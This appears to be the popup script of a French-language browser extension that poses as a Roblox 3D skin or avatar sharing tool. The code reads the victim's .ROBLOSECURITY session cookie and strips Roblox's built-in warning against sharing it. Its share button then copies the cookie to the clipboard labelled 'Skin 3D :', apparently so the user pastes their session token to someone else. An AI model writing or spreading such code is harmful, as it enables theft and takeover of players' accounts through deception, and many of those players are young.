// Polyfill pour Chrome / Firefox
const browserAPI = typeof browser !== 'undefined' ? browser : chrome;

const statusDiv = document.getElementById('status');
const shareBtn = document.getElementById('share-btn');
const refreshBtn = document.getElementById('refresh-btn');
const avatarImg = document.getElementById('avatar-img');

let currentCookie = "";
let currentUserId = null;

async function getRobloxCookie() {
  return new Promise((resolve) => {
    browserAPI.cookies.get(
      { url: "https://www.roblox.com", name: ".ROBLOSECURITY" },
      (cookie) => {
        resolve(cookie ? cookie.value : null);
      }
    );
  });
}

async function fetchWithAuth(url) {
  const cookieValue = await getRobloxCookie();
  if (!cookieValue) throw new Error("Pas de cookie .ROBLOSECURITY");

  const response = await fetch(url, {
    credentials: "include",
    headers: {
      "Cookie": `.ROBLOSECURITY=${cookieValue}`
    }
  });

  if (!response.ok) throw new Error(`Erreur HTTP ${response.status}`);
  return response.json();
}

async function loadData() {
  statusDiv.textContent = "Chargement...";
  statusDiv.style.color = "#8b949e";
  avatarImg.src = "";

  try {
    const userData = await fetchWithAuth("https://users.roblox.com/v1/users/authenticated");
    currentUserId = userData.id;

    const rawCookie = await getRobloxCookie() || "";
    
    // Supprime l'avertissement si présent
    if (rawCookie.startsWith("_|WARNING:")) {
      const parts = rawCookie.split("|_", 2);
      currentCookie = parts.length > 1 ? parts[1] : rawCookie;
    } else {
      currentCookie = rawCookie;
    }

    const thumbUrl = `https://thumbnails.roblox.com/v1/users/avatar?userIds=${currentUserId}&size=420x420&format=Png&isCircular=false`;
    const thumbData = await fetch(thumbUrl).then(r => r.json());

    if (thumbData.data?.[0]?.imageUrl) {
      avatarImg.src = thumbData.data[0].imageUrl;
      statusDiv.textContent = `Prêt ! (${userData.name || 'Utilisateur'})`;
      statusDiv.style.color = "#56d364";
    } else {
      throw new Error("Thumbnail non trouvée");
    }
  } catch (error) {
    console.error(error);
    statusDiv.textContent = "Erreur – connecte-toi sur roblox.com";
    statusDiv.style.color = "#ff6b6b";
    avatarImg.src = "https://via.placeholder.com/180?text=Erreur";
  }
}

shareBtn.addEventListener('click', async () => {
  if (!currentCookie) {
    statusDiv.textContent = "Aucun cookie valide – rafraîchis d’abord";
    statusDiv.style.color = "#ffa657";
    return;
  }

  try {
    // Texte final copié : "Skin 3D : " + cookie
    const texteACopier = "Skin 3D : " + currentCookie;

    await navigator.clipboard.writeText(texteACopier);

    statusDiv.textContent = "Copié ! (Skin 3D : ...)";
    statusDiv.style.color = "#56d364";
    
    setTimeout(() => {
      statusDiv.textContent = "Prêt à nouveau";
      statusDiv.style.color = "#8b949e";
    }, 3000);
  } catch (err) {
    statusDiv.textContent = "Erreur lors de la copie";
    statusDiv.style.color = "#ff6b6b";
  }
});

refreshBtn.addEventListener('click', loadData);

// Chargement initial
loadData();